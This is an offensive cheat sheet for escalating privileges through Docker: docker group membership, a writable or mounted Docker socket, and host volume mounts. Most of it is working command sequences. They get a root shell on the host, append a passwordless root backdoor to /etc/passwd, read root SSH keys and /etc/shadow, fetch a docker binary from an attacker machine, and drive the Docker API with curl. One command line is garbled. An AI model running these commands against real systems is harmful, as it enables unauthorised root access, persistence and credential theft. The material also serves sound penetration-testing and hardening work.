## Docker Privilege Escalation
Docker privilege escalation exploits the trust relationship between the Docker daemon (which runs as root) and users who have been granted access to it. There are three primary entry points: being in the `docker` group, finding a writable Docker socket, or already being inside a container that has the socket mounted. 

***
## Understanding the Docker Socket
The Docker socket (`/var/run/docker.sock`) is a Unix socket that the Docker daemon listens on. Any process that can write to it can issue commands directly to the Docker daemon, which executes them as root.  This is why socket access is functionally equivalent to root access on the host. By default it is owned by root and the `docker` group, with mode `srwxrwx---`. 

```bash
# Check socket location and permissions
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Jun 30 15:27 /var/run/docker.sock

# Check if a socket has been mounted inside a container you are in
find / -name "docker.sock" 2>/dev/null
ls -la /app/docker.sock
```

***
## Attack Vector 1: Docker Group Membership
Being in the `docker` group allows direct use of the `docker` binary to spawn a privileged container. 
```bash
# Confirm membership
id | grep docker
# groups=1000(docker-user),116(docker)

# One-liner: mount host root, chroot into it, get a shell
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
id
# uid=0(root) gid=0(root)

# Alternative: alpine (smaller, faster)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Targeted: only mount /etc to write a backdoor
docker run -v /etc:/mnt --rm -it alpine sh
echo 'hacker::0:0:root:/root:/bin/bash' >> /mnt/passwd
exit
su hacker

# Read SSH keys
docker run -v /root:/mnt --rm -it alpine cat /mnt/.ssh/id_rsa
```

***
## Attack Vector 2: Writable Docker Socket (from a Low-Priv Shell)
If the socket is writable by your current user (misconfigured permissions), you can use the docker binary against it directly, even without group membership. 

```bash
# Check socket permissions
ls -la /var/run/docker.sock
# srwxrwxrwx root root -> world-writable (misconfiguration)

# Use it directly
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

***
## Attack Vector 3: Docker Socket Mounted Inside a Container
A common operational pattern is mounting the Docker socket into a container so the container can manage other containers. This gives anyone with access to that container the ability to control the Docker daemon and escape to the host. 

### Detection
```bash
# Inside a container, look for a mounted socket
find / -name "docker.sock" 2>/dev/null
ls -la ~/app/
# srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```
### Exploitation Without Docker Binary Installed
If the `docker` binary is not inside the container, download it and upload it, or interact with the socket directly via `curl`:

```bash
# Transfer docker binary into the container
wget https://<attack-machine>/docker -O /tmp/docker
chmod +x /tmp/docker

# List running containers using the mounted socket
/tmp/docker -H unix:///app/docker.sock ps

# Spawn a new privileged container using an existing image (main_app in this case)
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged \
    -v /:/hostsystem main_app

# Exec into the new privileged container
/tmp/docker -H unix:///app/docker.sock exec -it tainer_id> /bin/bash

# Access the host filesystem
cat /hostsystem/root/.ssh/id_rsa
cat /hostsystem/etc/shadow
```
### Using curl Directly Against the Socket
If no docker binary is available and transfer is not possible, the Docker API is accessible via `curl` over the Unix socket:

```bash
# List images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

# Create a container with host root mounted
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q",
       "OpenStdin":true,"Tty":true,
       "HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create?name=escape

# Start the container
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/escape/start
```

***
## Attack Vector 4: Shared Directory (Volume Mount) Enumeration
When already inside a container, look for non-standard directories that represent host volume mounts. These are often left by administrators for legitimate data sharing but expose sensitive host paths. 

```bash
# Look for unusual top-level directories inside the container
ls /
# /hostsystem  /backups  /data  -> non-standard directories are likely mounts

# Check what is mounted
cat /proc/mounts
mount | grep -v "^overlay\|^proc\|^tmpfs"

# Explore any promising mount
ls -la /hostsystem/home/
cat /hostsystem/home/cry0l1t3/.ssh/id_rsa
cat /hostsystem/etc/shadow

# Use recovered SSH key
chmod 600 /tmp/cry0l1t3.priv
ssh cry0l1t3@<host_IP> -i /tmp/cry0l1t3.priv
```

***
## Detecting You Are Inside a Docker Container
Before trying container escape, confirm your context:

```bash
ls /.dockerenv              # Present in Docker containers
cat /proc/1/cgroup | grep docker
hostname                    # Often a 12-character hex string
cat /proc/self/mountinfo | grep overlay  # Overlay filesystem = container
env | grep -i docker
```

***
## Docker Escalation Path Summary
| Entry Point | Condition | Command |
|---|---|---|
| `docker` group | User is in docker group | `docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash` |
| Writable socket (host) | `/var/run/docker.sock` is world-writable | `docker -H unix:///var/run/docker.sock run -v /:/mnt ...` |
| Socket in container | Socket mounted at `/app/docker.sock` | Use docker binary or curl against the socket path |
| Volume mount (in container) | Host path mounted in container | Navigate the mount, extract keys and hashes |

The core rule is that Docker daemon access equals root access to the host filesystem. Elastic SIEM rules specifically monitor for non-root users interacting with Docker sockets as a high-confidence privilege escalation indicator. 
